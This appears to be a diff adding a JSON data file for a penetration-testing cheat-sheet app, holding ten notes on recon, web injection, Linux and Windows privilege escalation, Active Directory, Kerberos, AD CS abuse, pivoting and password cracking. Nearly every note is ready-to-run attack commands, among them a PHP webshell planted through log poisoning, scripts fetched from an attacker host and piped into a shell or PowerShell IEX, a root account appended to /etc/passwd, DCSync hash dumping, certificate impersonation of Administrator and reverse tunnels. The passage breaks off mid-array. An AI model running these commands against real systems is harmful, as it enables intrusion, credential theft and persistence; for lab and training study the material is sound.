@@ -1,0 +1,576 @@
+{
+  "notes": [
+    {
+      "id": "01-recon-port-scanning",
+      "title": "01. Network Discovery & Port Scanning Guide",
+      "titleEn": "01. Network Discovery & Port Scanning Guide",
+      "category": "01 Information Gathering & Recon",
+      "categoryOrder": 1,
+      "order": 1,
+      "rawCategory": "01 Information Gathering & Recon",
+      "subCategory": "01.1 Port Scanning",
+      "tags": [
+        "nmap",
+        "rustscan",
+        "masscan",
+        "snmp",
+        "smb",
+        "recon",
+        "network"
+      ],
+      "difficulty": "Core",
+      "stage": "Recon",
+      "tools": [
+        "nmap",
+        "rustscan",
+        "masscan",
+        "snmpwalk",
+        "smbmap"
+      ],
+      "summary": "Master network port scanning and host enumeration using Nmap, Rustscan, SNMP, and SMB discovery techniques.",
+      "enSummary": "Master network port scanning and host enumeration using Nmap, Rustscan, SNMP, and SMB discovery techniques.",
+      "commands": [
+        "nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}",
+        "nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}",
+        "sudo nmap -sU --top-ports 20 -Pn --open -oN nmap_udp.txt {TARGET_IP}",
+        "rustscan -a {TARGET_IP} -r 1-65535 --ulimit 5000 -- -sC -sV -oN rustscan.txt",
+        "snmpwalk -v 2c -c public {TARGET_IP}",
+        "smbmap -H {TARGET_IP} -u \"\" -p \"\""
+      ],
+      "relPath": "01 Information Gathering/01.1 Port Scanning/01. Network Discovery & Port Scanning Guide.md",
+      "filename": "01. Network Discovery & Port Scanning Guide.md",
+      "outgoingWikilinks": [
+        "02. Web Content Discovery & Directory Fuzzing",
+        "09. Pivoting, Tunnels & Lateral Movement"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 01. Network Discovery & Port Scanning Guide\n\n> [!NOTE]\n> Network reconnaissance is the foundational phase of any assessment. Fast port discovery combined with targeted script scans provides the attack surface blueprint.\n\n## 1. TCP Port Scanning Workflows\n\n### Initial Fast Scan\nScan the top 1000 TCP ports with version detection and default safe scripts:\n```bash\nnmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt {TARGET_IP}\n```\n\n### Full Exhaustive Scan\nScan all 65,535 TCP ports to discover non-standard services:\n```bash\nnmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full {TARGET_IP}\n```\n\n### Turbo RustScan\nAsynchronous port scanner that pipes directly into Nmap:\n```bash\nrustscan -a {TARGET_IP} -r 1-65535 --ulimit 5000 -- -sC -sV -oN rustscan.txt\n```\n\n## 2. UDP Service Discovery\nIdentify critical UDP services like SNMP, TFTP, DNS, and NTP:\n```bash\nsudo nmap -sU --top-ports 20 -Pn --open -oN nmap_udp.txt {TARGET_IP}\n```\n\n## 3. Supplementary Enumeration\n- **SNMP Community String**: `snmpwalk -v 2c -c public {TARGET_IP}`\n- **SMB Guest Shares**: `smbmap -H {TARGET_IP} -u \"\" -p \"\"`\n\n> [!TIP]\n> Always verify exposed web ports and transition to [[02. Web Content Discovery & Directory Fuzzing]] or pivot via [[09. Pivoting, Tunnels & Lateral Movement]].\n"
+    },
+    {
+      "id": "02-web-directory-fuzzing",
+      "title": "02. Web Content Discovery & Directory Fuzzing",
+      "titleEn": "02. Web Content Discovery & Directory Fuzzing",
+      "category": "02 Web & Application Enumeration",
+      "categoryOrder": 2,
+      "order": 2,
+      "rawCategory": "02 Web & Application Enumeration",
+      "subCategory": "02.1 Directory & VHost Fuzzing",
+      "tags": [
+        "ffuf",
+        "gobuster",
+        "feroxbuster",
+        "vhost",
+        "fuzzing",
+        "web"
+      ],
+      "difficulty": "Core",
+      "stage": "Recon",
+      "tools": [
+        "ffuf",
+        "gobuster",
+        "feroxbuster",
+        "wpscan"
+      ],
+      "summary": "Exhaustive web path discovery, virtual host routing, parameter fuzzing, and CMS audit methodologies.",
+      "enSummary": "Exhaustive web path discovery, virtual host routing, parameter fuzzing, and CMS audit methodologies.",
+      "commands": [
+        "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.html,.txt,.bak -ac -mc 200,301,302,403",
+        "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H \"Host: FUZZ.target.htb\" -mc 200,301,302 -fs 1234",
+        "gobuster dir -u http://{TARGET_IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -b 404",
+        "feroxbuster -u http://{TARGET_IP}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp -d 2",
+        "wpscan --url http://{TARGET_IP}/ --enumerate ap,at,u,cb --plugins-detection aggressive"
+      ],
+      "relPath": "02 Web & Application Enumeration/02.1 Directory & VHost Fuzzing/02. Web Content Discovery & Directory Fuzzing.md",
+      "filename": "02. Web Content Discovery & Directory Fuzzing.md",
+      "outgoingWikilinks": [
+        "03. Web Application Exploitation & Injection",
+        "01. Network Discovery & Port Scanning Guide"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 02. Web Content Discovery & Directory Fuzzing\n\n> [!NOTE]\n> Web applications represent the largest initial foothold vector. Fuzzing endpoints and virtual host headers uncovers unindexed administration portals and legacy scripts.\n\n## 1. Directory & File Fuzzing with ffuf\nHigh-speed discovery with automatic calibration and extension recursion:\n```bash\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://{TARGET_IP}/FUZZ -e .php,.html,.txt,.bak -ac -mc 200,301,302,403\n```\n\n## 2. Virtual Host (VHost) Fuzzing\nDiscover hidden subdomains routing on the same IP:\n```bash\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H \"Host: FUZZ.target.htb\" -mc 200,301,302 -fs 1234\n```\n\n## 3. Recursive Crawling with Feroxbuster\nRecursively traverse directories to depth 2:\n```bash\nferoxbuster -u http://{TARGET_IP}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,asp,aspx,jsp -d 2\n```\n\n## 4. WordPress CMS Audit\n```bash\nwpscan --url http://{TARGET_IP}/ --enumerate ap,at,u,cb --plugins-detection aggressive\n```\n\n> [!TIP]\n> After identifying vulnerable parameters, proceed to [[03. Web Application Exploitation & Injection]].\n"
+    },
+    {
+      "id": "03-web-exploitation-injection",
+      "title": "03. Web Application Exploitation & Injection",
+      "titleEn": "03. Web Application Exploitation & Injection",
+      "category": "03 Exploitation & Payloads",
+      "categoryOrder": 3,
+      "order": 3,
+      "rawCategory": "03 Exploitation & Payloads",
+      "subCategory": "03.1 Web Attacks",
+      "tags": [
+        "sqli",
+        "sqlmap",
+        "lfi",
+        "rce",
+        "jwt",
+        "graphql",
+        "exploitation"
+      ],
+      "difficulty": "Medium",
+      "stage": "Foothold",
+      "tools": [
+        "sqlmap",
+        "curl",
+        "hashcat",
+        "burpsuite"
+      ],
+      "summary": "Core web exploitation vectors: SQL Injection, Local File Inclusion to RCE, JWT manipulation, and GraphQL introspection.",
+      "enSummary": "Core web exploitation vectors: SQL Injection, Local File Inclusion to RCE, JWT manipulation, and GraphQL introspection.",
+      "commands": [
+        "sqlmap -u \"http://{TARGET_IP}/item.php?id=1\" --batch --random-agent --level=3 --risk=2 --dbs",
+        "sqlmap -r request.txt -p username --batch --current-db --dump",
+        "http://{TARGET_IP}/index.php?page=php://filter/convert.base64-encode/resource=config.php",
+        "curl -s -A \"<?php system(\\$_GET['cmd']); ?>\" http://{TARGET_IP}/ && curl \"http://{TARGET_IP}/index.php?page=/var/log/apache2/access.log&cmd=id\"",
+        "curl -s -X POST -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}' http://{TARGET_IP}/graphql | jq .",
+        "git-dumper http://{TARGET_IP}/.git/ ./git-repo"
+      ],
+      "relPath": "03 Exploitation & Payloads/03.1 Web Attacks/03. Web Application Exploitation & Injection.md",
+      "filename": "03. Web Application Exploitation & Injection.md",
+      "outgoingWikilinks": [
+        "12. Interactive TTY Stabilization & Terminal Spawning",
+        "04. Linux Privilege Escalation Master Guide"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 03. Web Application Exploitation & Injection\n\n> [!IMPORTANT]\n> Always verify database technology and backend language before launching automated tools to prevent denial-of-service.\n\n## 1. Automated SQL Injection with SQLmap\nExtract databases using risk and level heuristics:\n```bash\nsqlmap -u \"http://{TARGET_IP}/item.php?id=1\" --batch --random-agent --level=3 --risk=2 --dbs\n```\nTarget saved HTTP request from Burp Suite:\n```bash\nsqlmap -r request.txt -p username --batch --current-db --dump\n```\n\n## 2. Local File Inclusion (LFI) & Log Poisoning\nRead source code via PHP wrapper:\n```text\nhttp://{TARGET_IP}/index.php?page=php://filter/convert.base64-encode/resource=config.php\n```\nPoison Apache access log via User-Agent header:\n```bash\ncurl -s -A \"<?php system($_GET['cmd']); ?>\" http://{TARGET_IP}/\ncurl \"http://{TARGET_IP}/index.php?page=/var/log/apache2/access.log&cmd=id\"\n```\n\n## 3. GraphQL Introspection\nDump all schema types and query fields:\n```bash\ncurl -s -X POST -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}' http://{TARGET_IP}/graphql | jq .\n```\n\n> [!TIP]\n> Once a reverse shell is obtained, stabilize your terminal immediately using [[12. Interactive TTY Stabilization & Terminal Spawning]] before escalating privileges via [[04. Linux Privilege Escalation Master Guide]].\n"
+    },
+    {
+      "id": "04-linux-privesc-master",
+      "title": "04. Linux Privilege Escalation Master Guide",
+      "titleEn": "04. Linux Privilege Escalation Master Guide",
+      "category": "04 Linux Privilege Escalation",
+      "categoryOrder": 4,
+      "order": 4,
+      "rawCategory": "04 Linux Privilege Escalation",
+      "subCategory": "04.1 Linux PrivEsc",
+      "tags": [
+        "linux",
+        "privesc",
+        "suid",
+        "sudo",
+        "cron",
+        "capabilities",
+        "gtfobins"
+      ],
+      "difficulty": "Core",
+      "stage": "PrivEsc",
+      "tools": [
+        "linpeas",
+        "pspy",
+        "find",
+        "getcap",
+        "sudo"
+      ],
+      "summary": "Comprehensive Linux privilege escalation checklist: SUID binaries, Linux capabilities, sudo misconfigurations, cron wildcards, and container escapes.",
+      "enSummary": "Comprehensive Linux privilege escalation checklist: SUID binaries, Linux capabilities, sudo misconfigurations, cron wildcards, and container escapes.",
+      "commands": [
+        "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;",
+        "getcap -r / 2>/dev/null",
+        "sudo -l",
+        "curl -L http://{LHOST}:8000/linpeas.sh | sh",
+        "./pspy64 -pf -i 1000",
+        "touch /var/backup/--checkpoint=1 && touch \"/var/backup/--checkpoint-action=exec=sh root.sh\"",
+        "echo \"toor:$(openssl passwd -1 -salt evil Password123!):0:0:root:/root:/bin/bash\" >> /etc/passwd",
+        "docker run -v /:/host -it alpine chroot /host /bin/bash"
+      ],
+      "relPath": "04 Linux Privilege Escalation/04.1 Linux PrivEsc/04. Linux Privilege Escalation Master Guide.md",
+      "filename": "04. Linux Privilege Escalation Master Guide.md",
+      "outgoingWikilinks": [
+        "10. Password Cracking & Hash Identification",
+        "12. Interactive TTY Stabilization & Terminal Spawning"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 04. Linux Privilege Escalation Master Guide\n\n> [!NOTE]\n> Privilege escalation on Linux relies on identifying misconfigured permissions, SUID binaries, custom root cronjobs, or kernel vulnerabilities.\n\n## 1. SUID Binaries & Capabilities\nFind all files with SUID bit set:\n```bash\nfind / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;\n```\nAudit binary capabilities:\n```bash\ngetcap -r / 2>/dev/null\n```\n\n## 2. Sudo Privileges & GTFOBins\nCheck current user permissions:\n```bash\nsudo -l\n```\n\n## 3. Automated Enumeration\nPipe LinPEAS directly into bash memory:\n```bash\ncurl -L http://{LHOST}:8000/linpeas.sh | sh\n```\nSniff transient cronjobs with pspy without root privileges:\n```bash\n./pspy64 -pf -i 1000\n```\n\n## 4. Tar Wildcard Injection Exploit\nIf a root cronjob runs `tar -czf backup.tar.gz *`:\n```bash\ntouch /var/backup/--checkpoint=1\ntouch \"/var/backup/--checkpoint-action=exec=sh root.sh\"\n```\n\n## 5. Docker Container Escape\nMount the host root filesystem from inside Docker:\n```bash\ndocker run -v /:/host -it alpine chroot /host /bin/bash\n```\n\n> [!TIP]\n> Check extracted hashes against [[10. Password Cracking & Hash Identification]].\n"
+    },
+    {
+      "id": "05-windows-privesc-lolbas",
+      "title": "05. Windows Local Privilege Escalation & LOLBAS",
+      "titleEn": "05. Windows Local Privilege Escalation & LOLBAS",
+      "category": "05 Windows & Active Directory",
+      "categoryOrder": 5,
+      "order": 5,
+      "rawCategory": "05 Windows & Active Directory",
+      "subCategory": "05.1 Local PrivEsc",
+      "tags": [
+        "windows",
+        "privesc",
+        "seimpersonate",
+        "godpotato",
+        "printspoofer",
+        "winpeas",
+        "lolbas"
+      ],
+      "difficulty": "Medium",
+      "stage": "PrivEsc",
+      "tools": [
+        "winpeas",
+        "godpotato",
+        "printspoofer",
+        "certutil",
+        "powershell"
+      ],
+      "summary": "Local Windows privilege escalation vectors: Token impersonation (Potato exploits), Unquoted Service Paths, AlwaysInstallElevated, and LOLBAS.",
+      "enSummary": "Local Windows privilege escalation vectors: Token impersonation (Potato exploits), Unquoted Service Paths, AlwaysInstallElevated, and LOLBAS.",
+      "commands": [
+        "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:8000/winPEAS.ps1')\"",
+        "GodPotato-NET4.exe -cmd \"cmd.exe /c whoami\"",
+        "PrintSpoofer64.exe -i -c cmd",
+        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+        "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\""
+      ],
+      "relPath": "05 Windows & Active Directory/05.1 Local PrivEsc/05. Windows Local Privilege Escalation & LOLBAS.md",
+      "filename": "05. Windows Local Privilege Escalation & LOLBAS.md",
+      "outgoingWikilinks": [
+        "06. Active Directory Attack Paths & Domain Enumeration",
+        "11. Offensive File Transfers Across Restricted Networks"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 05. Windows Local Privilege Escalation & LOLBAS\n\n> [!NOTE]\n> On Windows, service accounts frequently hold privileges like `SeImpersonatePrivilege` that permit direct escalation to `NT AUTHORITY\\SYSTEM`.\n\n## 1. Token Impersonation Exploits\nIf `whoami /priv` reveals `SeImpersonatePrivilege`:\n- **GodPotato** (Windows Server 2012-2022):\n  ```cmd\n  GodPotato-NET4.exe -cmd \"cmd.exe /c whoami\"\n  ```\n- **PrintSpoofer** (Named pipe print spooler impersonation):\n  ```cmd\n  PrintSpoofer64.exe -i -c cmd\n  ```\n\n## 2. AlwaysInstallElevated Registry Keys\nCheck if MSI installers run with elevated permissions:\n```cmd\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n```\n\n## 3. Unquoted Service Paths\nDetect unquoted service binary paths containing spaces:\n```cmd\nwmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n```\n\n> [!TIP]\n> Stage binaries using [[11. Offensive File Transfers Across Restricted Networks]], then pivot toward domain control via [[06. Active Directory Attack Paths & Domain Enumeration]].\n"
+    },
+    {
+      "id": "06-ad-attack-paths-enum",
+      "title": "06. Active Directory Attack Paths & Domain Enumeration",
+      "titleEn": "06. Active Directory Attack Paths & Domain Enumeration",
+      "category": "05 Windows & Active Directory",
+      "categoryOrder": 5,
+      "order": 6,
+      "rawCategory": "05 Windows & Active Directory",
+      "subCategory": "05.2 Active Directory",
+      "tags": [
+        "active-directory",
+        "bloodhound",
+        "powerview",
+        "netexec",
+        "impacket",
+        "domain"
+      ],
+      "difficulty": "Hard",
+      "stage": "Lateral Movement",
+      "tools": [
+        "bloodhound",
+        "sharphound",
+        "powerview",
+        "netexec",
+        "impacket"
+      ],
+      "summary": "Domain mapping and attack path analysis using SharpHound, BloodHound, NetExec, and Impacket secretsdump.",
+      "enSummary": "Domain mapping and attack path analysis using SharpHound, BloodHound, NetExec, and Impacket secretsdump.",
+      "commands": [
+        ".\\SharpHound.exe -c All,GPOLocalGroup --zipfilename htb_ad.zip",
+        "nxc smb {TARGET_IP} -u {USER} -p \"{PASSWORD}\" --shares",
+        "rpcclient -U \"\" -N {TARGET_IP} -c \"enumdomusers; querydispinfo; enumdomgroups\"",
+        "evil-winrm -i {TARGET_IP} -u {USER} -p \"{PASSWORD}\" -s /opt/scripts",
+        "impacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm"
+      ],
+      "relPath": "05 Windows & Active Directory/05.2 Active Directory/06. Active Directory Attack Paths & Domain Enumeration.md",
+      "filename": "06. Active Directory Attack Paths & Domain Enumeration.md",
+      "outgoingWikilinks": [
+        "07. Kerberos Exploitation: AS-REP & Kerberoasting",
+        "08. Active Directory Certificate Services (AD CS) Abuse"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 06. Active Directory Attack Paths & Domain Enumeration\n\n> [!IMPORTANT]\n> Active Directory environments rely on complex trust relationships, ACL permissions, and Kerberos delegation.\n\n## 1. BloodHound / SharpHound Telemetry\nCollect all domain objects, groups, sessions, and ACLs:\n```cmd\n.\\SharpHound.exe -c All,GPOLocalGroup --zipfilename htb_ad.zip\n```\n\n## 2. NetExec (CrackMapExec) Domain Sweep\nVerify credentials and locate administrative access across subnets:\n```bash\nnxc smb {TARGET_IP} -u {USER} -p \"{PASSWORD}\" --shares\n```\n\n## 3. Remote PowerShell with Evil-WinRM\n```bash\nevil-winrm -i {TARGET_IP} -u {USER} -p \"{PASSWORD}\" -s /opt/scripts\n```\n\n## 4. DCSync Credential Extraction\nDump all NTLM password hashes directly over RPC:\n```bash\nimpacket-secretsdump {DOMAIN}/{USER}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm\n```\n\n> [!TIP]\n> Combine domain enumeration with [[07. Kerberos Exploitation: AS-REP & Kerberoasting]] and [[08. Active Directory Certificate Services (AD CS) Abuse]].\n"
+    },
+    {
+      "id": "07-kerberos-attacks-master",
+      "title": "07. Kerberos Exploitation: AS-REP & Kerberoasting",
+      "titleEn": "07. Kerberos Exploitation: AS-REP & Kerberoasting",
+      "category": "05 Windows & Active Directory",
+      "categoryOrder": 5,
+      "order": 7,
+      "rawCategory": "05 Windows & Active Directory",
+      "subCategory": "05.3 Kerberos Attacks",
+      "tags": [
+        "kerberos",
+        "kerberoasting",
+        "asreproast",
+        "impacket",
+        "hashcat",
+        "spn"
+      ],
+      "difficulty": "Medium",
+      "stage": "Credential Access",
+      "tools": [
+        "impacket",
+        "hashcat",
+        "rubeus"
+      ],
+      "summary": "Kerberos ticket attacks: AS-REP Roasting for preauth-disabled accounts and Kerberoasting Service Principal Names.",
+      "enSummary": "Kerberos ticket attacks: AS-REP Roasting for preauth-disabled accounts and Kerberoasting Service Principal Names.",
+      "commands": [
+        "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asreproast.hashes",
+        "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile hashes.kerberoast",
+        "hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -O"
+      ],
+      "relPath": "05 Windows & Active Directory/05.3 Kerberos Attacks/07. Kerberos Exploitation: AS-REP & Kerberoasting.md",
+      "filename": "07. Kerberos Exploitation: AS-REP & Kerberoasting.md",
+      "outgoingWikilinks": [
+        "06. Active Directory Attack Paths & Domain Enumeration",
+        "10. Password Cracking & Hash Identification"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 07. Kerberos Exploitation: AS-REP & Kerberoasting\n\n> [!NOTE]\n> Kerberos attacks allow attackers to extract encrypted password hashes from Domain Controllers without triggering account lockouts.\n\n## 1. AS-REP Roasting (No Pre-Authentication)\nTarget users that have `DONT_REQ_PREAUTH` enabled:\n```bash\nimpacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asreproast.hashes\n```\nCrack with Hashcat Mode 18200:\n```bash\nhashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -O\n```\n\n## 2. Kerberoasting (Service Principal Names)\nRequest TGS tickets for accounts configured with an SPN:\n```bash\nimpacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile hashes.kerberoast\n```\nCrack with Hashcat Mode 13100:\n```bash\nhashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -O\n```\n\n> [!TIP]\n> Reference Hashcat mode numbers in [[10. Password Cracking & Hash Identification]].\n"
+    },
+    {
+      "id": "08-adcs-certipy-abuse",
+      "title": "08. Active Directory Certificate Services (AD CS) Abuse",
+      "titleEn": "08. Active Directory Certificate Services (AD CS) Abuse",
+      "category": "05 Windows & Active Directory",
+      "categoryOrder": 5,
+      "order": 8,
+      "rawCategory": "05 Windows & Active Directory",
+      "subCategory": "05.4 AD CS & PKI",
+      "tags": [
+        "adcs",
+        "certipy",
+        "certificates",
+        "esc1",
+        "pki",
+        "active-directory"
+      ],
+      "difficulty": "Hard",
+      "stage": "PrivEsc",
+      "tools": [
+        "certipy",
+        "pkinit"
+      ],
+      "summary": "Active Directory Certificate Services (AD CS) misconfiguration discovery and exploitation using Certipy (ESC1-ESC13).",
+      "enSummary": "Active Directory Certificate Services (AD CS) misconfiguration discovery and exploitation using Certipy (ESC1-ESC13).",
+      "commands": [
+        "certipy find -u {USER}@{DOMAIN} -p \"{PASSWORD}\" -dc-ip {TARGET_IP} -vulnerable -stdout",
+        "certipy req -u {USER}@{DOMAIN} -p \"{PASSWORD}\" -dc-ip {TARGET_IP} -ca {CA_NAME} -template ESC1_Template -upn Administrator@{DOMAIN}",
+        "certipy auth -pfx administrator.pfx -dc-ip {TARGET_IP}"
+      ],
+      "relPath": "05 Windows & Active Directory/05.4 AD CS & PKI/08. Active Directory Certificate Services (AD CS) Abuse.md",
+      "filename": "08. Active Directory Certificate Services (AD CS) Abuse.md",
+      "outgoingWikilinks": [
+        "06. Active Directory Attack Paths & Domain Enumeration",
+        "05. Windows Local Privilege Escalation & LOLBAS"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 08. Active Directory Certificate Services (AD CS) Abuse\n\n> [!IMPORTANT]\n> AD CS provides PKI capabilities for Active Directory. Misconfigured certificate templates grant low-privileged users the ability to impersonate Domain Administrators.\n\n## 1. Vulnerability Discovery\nScan the domain for vulnerable certificate templates:\n```bash\ncertipy find -u {USER}@{DOMAIN} -p \"{PASSWORD}\" -dc-ip {TARGET_IP} -vulnerable -stdout\n```\n\n## 2. ESC1 Abuse (Enrollee Supplies Subject / Client Auth)\nRequest a certificate for `Administrator`:\n```bash\ncertipy req -u {USER}@{DOMAIN} -p \"{PASSWORD}\" -dc-ip {TARGET_IP} -ca {CA_NAME} -template ESC1_Template -upn Administrator@{DOMAIN}\n```\n\n## 3. Authenticate & Obtain NT Hash\nAuthenticate with the generated PFX certificate to extract the Administrator's NT hash:\n```bash\ncertipy auth -pfx administrator.pfx -dc-ip {TARGET_IP}\n```\n\n> [!TIP]\n> Use the acquired NT hash for Pass-The-Hash execution via [[06. Active Directory Attack Paths & Domain Enumeration]].\n"
+    },
+    {
+      "id": "09-pivoting-tunnels-master",
+      "title": "09. Pivoting, Tunnels & Lateral Movement",
+      "titleEn": "09. Pivoting, Tunnels & Lateral Movement",
+      "category": "06 Pivoting & Lateral Movement",
+      "categoryOrder": 6,
+      "order": 9,
+      "rawCategory": "06 Pivoting & Lateral Movement",
+      "subCategory": "06.1 Network Tunnels",
+      "tags": [
+        "pivoting",
+        "ligolo",
+        "chisel",
+        "ssh",
+        "proxychains",
+        "socat",
+        "tunnels"
+      ],
+      "difficulty": "Hard",
+      "stage": "Lateral Movement",
+      "tools": [
+        "ligolo-ng",
+        "chisel",
+        "ssh",
+        "proxychains",
+        "socat"
+      ],
+      "summary": "Deep network pivoting: Ligolo-ng TUN routing, Chisel SOCKS5 reverse proxies, SSH port forwarding, and Proxychains routing.",
+      "enSummary": "Deep network pivoting: Ligolo-ng TUN routing, Chisel SOCKS5 reverse proxies, SSH port forwarding, and Proxychains routing.",
+      "commands": [
+        "./chisel server -p 8000 --reverse",
+        "./chisel client {LHOST}:8000 R:socks",
+        "ssh -D 1080 -f -C -q -N {USER}@{TARGET_IP}",
+        "ssh -L 9999:127.0.0.1:8443 {USER}@{TARGET_IP} -N",
+        "ssh -R {LPORT}:127.0.0.1:80 {USER}@{LHOST} -N",
+        "proxychains4 -q nmap -sT -Pn -p 21,22,80,445,3389 172.16.1.10",
+        "socat TCP-LISTEN:8080,fork,reuseaddr TCP:{LHOST}:{LPORT}",
+        "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.50"
+      ],
+      "relPath": "06 Pivoting & Lateral Movement/06.1 Network Tunnels/09. Pivoting, Tunnels & Lateral Movement.md",
+      "filename": "09. Pivoting, Tunnels & Lateral Movement.md",
+      "outgoingWikilinks": [
+        "01. Network Discovery & Port Scanning Guide",
+        "11. Offensive File Transfers Across Restricted Networks"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 09. Pivoting, Tunnels & Lateral Movement\n\n> [!NOTE]\n> In multi-tiered networks, compromised dual-homed hosts act as pivot jumpboxes into isolated internal subnets.\n\n## 1. Chisel Reverse SOCKS Tunnel\n- **Attacker Server**:\n  ```bash\n  ./chisel server -p 8000 --reverse\n  ```\n- **Victim Client**:\n  ```bash\n  ./chisel client {LHOST}:8000 R:socks\n  ```\n\n## 2. SSH Port Forwarding\n- **Dynamic SOCKS5 Proxy (-D)**:\n  ```bash\n  ssh -D 1080 -f -C -q -N {USER}@{TARGET_IP}\n  ```\n- **Local Port Forward (-L)**:\n  ```bash\n  ssh -L 9999:127.0.0.1:8443 {USER}@{TARGET_IP} -N\n  ```\n- **Remote Port Forward (-R)**:\n  ```bash\n  ssh -R {LPORT}:127.0.0.1:80 {USER}@{LHOST} -N\n  ```\n\n## 3. Proxychains Scanning\nRoute tools through configured SOCKS5 proxy:\n```bash\nproxychains4 -q nmap -sT -Pn -p 21,22,80,445,3389 172.16.1.10\n```\n\n> [!TIP]\n> Stage tunnel binaries using [[11. Offensive File Transfers Across Restricted Networks]].\n"
+    },
+    {
+      "id": "10-password-cracking-hashcat",
+      "title": "10. Password Cracking & Hash Identification",
+      "titleEn": "10. Password Cracking & Hash Identification",
+      "category": "07 Cryptography & Password Cracking",
+      "categoryOrder": 7,
+      "order": 10,
+      "rawCategory": "07 Cryptography & Password Cracking",
+      "subCategory": "07.1 Hash Cracking",
+      "tags": [
+        "hashcat",
+        "john",
+        "cracking",
+        "rockyou",
+        "hashes",
+        "crypto"
+      ],
+      "difficulty": "Core",
+      "stage": "Credential Access",
+      "tools": [
+        "hashcat",
+        "john",
+        "hash-identifier"
+      ],
+      "summary": "Offline password recovery: Hashcat modes cheat sheet, John the Ripper formats, and dictionary mutation rules.",
+      "enSummary": "Offline password recovery: Hashcat modes cheat sheet, John the Ripper formats, and dictionary mutation rules.",
+      "commands": [
+        "hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hashcat -m 1800 shadow.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hashcat -m 18200 asreproast.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hashcat -m 3200 bcrypt.hashes /usr/share/wordlists/rockyou.txt -O",
+        "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET_IP} ssh -t 4"
+      ],
+      "relPath": "07 Cryptography & Password Cracking/07.1 Hash Cracking/10. Password Cracking & Hash Identification.md",
+      "filename": "10. Password Cracking & Hash Identification.md",
+      "outgoingWikilinks": [
+        "07. Kerberos Exploitation: AS-REP & Kerberoasting",
+        "04. Linux Privilege Escalation Master Guide"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 10. Password Cracking & Hash Identification\n\n> [!NOTE]\n> High-performance GPU cracking with Hashcat recovers plaintext credentials from dumped password hashes.\n\n## 1. Hashcat Essential Modes Reference\n| Mode (`-m`) | Hash Format | Typical Source |\n|---|---|---|\n| `1000` | NTLM | Windows SAM / NTDS.dit |\n| `1800` | SHA512crypt (`$6$`) | Linux `/etc/shadow` |\n| `13100` | Kerberos 5 TGS | Active Directory Kerberoasting |\n| `18200` | Kerberos 5 AS-REP | Active Directory AS-REP Roasting |\n| `3200` | bcrypt (`$2y$`, `$2a$`) | Modern Web Databases |\n| `16500` | JWT (JSON Web Token) | Web API Tokens |\n\n## 2. Command Examples\n- **Crack NTLM**:\n  ```bash\n  hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt -O\n  ```\n- **Crack Kerberoast**:\n  ```bash\n  hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -O\n  ```\n\n> [!TIP]\n> Use cracked administrative credentials for lateral movement in [[06. Active Directory Attack Paths & Domain Enumeration]].\n"
+    },
+    {
